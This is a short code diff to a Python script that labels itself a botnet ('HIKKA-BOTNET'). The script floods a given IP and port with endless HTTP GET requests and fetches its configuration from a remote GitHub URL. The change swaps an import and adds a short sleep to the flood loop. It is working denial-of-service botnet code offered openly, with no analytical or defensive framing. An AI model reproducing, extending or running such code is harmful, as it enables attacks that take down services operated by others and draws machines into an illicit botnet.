@@ -4,7 +4,7 @@ HIKKA-BOTNET, если вы участвуете в
 системе ботнет, напишите овнеру."""
 # @hotdrify <-- OWNER
 #[+]=================================[+]#
-import json
+import time
 import asyncio
 import aiohttp
 
@@ -13,6 +13,7 @@ async def get(ip, port):
         while True:
             async with session.get(f"http://{ip}:{port}") as response:
                 await response.read()
+            await asyncio.sleep(0.2)
 
 async def main():
     cfg = await aiohttp.get("https://raw.githubusercontent.com/HotDrify/hikka.modules/main/assets/config.json")
